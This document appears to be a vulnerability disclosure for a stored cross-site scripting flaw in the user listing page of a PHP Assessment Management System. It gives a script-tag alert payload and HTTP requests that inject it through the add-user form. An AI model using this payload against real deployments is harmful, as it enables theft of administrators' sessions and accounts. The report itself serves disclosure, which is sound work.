#   Assessment Management System admin/view-users.php Stored XSS Vulnerability

  A stored cross-site scripting (XSS) vulnerability exists in the `admin/view-users.php` file of the Assessment
  Management System. User-controlled fields stored in the `users` table, such as `name`, `surname`, `email`, and
  `username`, are rendered directly into the HTML response without proper output encoding. As a result, an attacker can
  inject arbitrary JavaScript that executes when an administrator or another privileged user views the user list page.

##  

##  Impact of the Vulnerability

  This vulnerability may allow an attacker to execute arbitrary JavaScript in the browser of a logged-in administrator,
  leading to session theft, unauthorized actions, sensitive information disclosure, or full compromise of the affected
  user's account context within the application.

##  

##  Payload

```
<script>alert(9999)</script>
```

<script>alert(9999)</script>



##   Proof of Concept

  Submit the payload into a user field that is later displayed in the user listing page, for example the `name`
  parameter in `admin/add-user.php`:

```http
POST /admin/add-user.php HTTP/1.1
Host: assessment
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=f11os756ltsdgbtk776pklo8cs

name=<script>alert(9999)</script>&sname=test&email=test9999%40example.com&password=123456&rank=three&submit=Add+User
```

  After the record is saved, browse to:

```http
GET /admin/view-users.php HTTP/1.1
Host: assessment
Cookie: PHPSESSID=f11os756ltsdgbtk776pklo8cs
```

  The application outputs user-controlled values directly into table cells in `admin/view-users.php` without HTML
  escaping. When the page renders the malicious record, the injected JavaScript executes in the victim's browser,
  confirming the presence of a stored XSS vulnerability.

##  

##  Source Download

```
 [Assessment Management In PHP With Source Code - Source Code & Projects](https://code-projects.org/assessment-management-in-php-with-source-code/)
```

[Assessment Management In PHP With Source Code - Source Code & Projects](https://code-projects.org/assessment-management-in-php-with-source-code/)
